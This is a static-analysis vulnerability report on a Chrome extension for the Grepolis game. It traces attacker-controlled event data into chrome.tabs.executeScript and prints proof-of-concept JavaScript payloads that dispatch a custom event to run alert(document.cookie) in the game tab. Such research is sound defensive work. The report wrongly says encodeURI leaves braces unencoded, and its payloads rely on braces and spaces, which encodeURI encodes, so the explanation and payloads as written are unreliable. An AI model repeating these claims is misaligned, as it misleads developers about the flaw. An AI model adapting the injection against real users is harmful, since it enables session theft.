# CoCo Analysis: fehekolnlpmcpflkgchknkboeanmhicc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (two variants of the same vulnerability, coordX and coordY)

---

## Sink: document_eventListener_gtkAskAddonShowInGame → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Desktop/help/16_COCO_RATE/fehekolnlpmcpflkgchknkboeanmhicc/opgen_generated_files/cs_1.js
Line 491    document.addEventListener('gtkAskAddonShowInGame', function(event) {
Line 492        chrome.runtime.sendMessage({data: event.detail}, function(response) {

$FilePath$/Users/jianjia/Desktop/help/16_COCO_RATE/fehekolnlpmcpflkgchknkboeanmhicc/opgen_generated_files/bg.js
Line 939    chrome.tabs.executeScript(tabs[0].id, {code: "window.postMessage({ type: 'gtkShowInGame', coordX: " + encodeURI(data.coordX) + ", coordY: " + encodeURI(data.coordY) + " }, '*');"});
```

**Code:**

```javascript
// Content script - Entry point (js/map_connector.js on grepolistoolkit.com)
document.addEventListener('gtkAskAddonShowInGame', function(event) {
    chrome.runtime.sendMessage({data: event.detail}, function(response) {  // ← attacker-controlled event.detail
        if (!response.success) {
            alert(response.message);
        } else if (!response.doesUpdateTab) {
            alert('La carte a bien été centrée en jeu');
        }
    });
});

// Background script - Message handler (background.js)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    var data = request.data;  // ← attacker-controlled data
    chrome.tabs.query({url: 'https://' + data.worldNum + '.grepolis.com/*'}, function(tabs) {
        if (tabs.length > 0) {
            // SINK: Code injection via string concatenation
            chrome.tabs.executeScript(tabs[0].id, {
                code: "window.postMessage({ type: 'gtkShowInGame', coordX: " + encodeURI(data.coordX) + ", coordY: " + encodeURI(data.coordY) + " }, '*');"
                // ← encodeURI is insufficient to prevent code injection
                // ← attacker-controlled coordX and coordY injected into code string
            });
            sendResponse({
                success: true,
                doesUpdateTab: data.doesUpdateTab
            });
            chrome.tabs.update(tabs[0].id, {highlighted: true});
        } else {
            sendResponse({
                success: false,
                message: 'Le jeu n\'est pas ouvert'
            });
        }
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `https://*.grepolistoolkit.com/*` (content script runs on this domain)

**Attack Vector:** Custom DOM event dispatch from malicious webpage

**Attack:**

```javascript
// Malicious code on grepolistoolkit.com website
// encodeURI does NOT encode quotes, allowing JavaScript injection

// Attack payload - break out of the string context
var maliciousPayload = {
    worldNum: "en123",  // Valid world number
    coordX: '0}); alert(document.cookie); void({x:0',  // Breaks out of object literal
    coordY: "0",
    doesUpdateTab: false
};

// Dispatch custom event to trigger the vulnerability
var event = new CustomEvent('gtkAskAddonShowInGame', {
    detail: maliciousPayload
});
document.dispatchEvent(event);

// The constructed code becomes:
// "window.postMessage({ type: 'gtkShowInGame', coordX: 0}); alert(document.cookie); void({x:0, coordY: 0 }, '*');"
// This executes alert(document.cookie) in the context of the target tab (grepolis.com)

// Alternative payload using property injection:
var payload2 = {
    worldNum: "en123",
    coordX: '1, evilProp: (alert(document.cookie), 1), validProp: 1',
    coordY: "0",
    doesUpdateTab: false
};
// Becomes: coordX: 1, evilProp: (alert(document.cookie), 1), validProp: 1, coordY: 0
```

**Impact:** Arbitrary code execution in any open tab matching `https://*.grepolis.com/*`. An attacker controlling the grepolistoolkit.com website can execute arbitrary JavaScript in the game's context, allowing them to:
- Steal authentication cookies and session tokens from grepolis.com
- Perform actions on behalf of the user in the game
- Exfiltrate game data and user information
- Manipulate the game interface and state

The vulnerability exists because encodeURI() only encodes URL-unsafe characters and does NOT encode JavaScript syntax characters like quotes, braces, semicolons, or parentheses, allowing attackers to break out of the string context and inject arbitrary code.
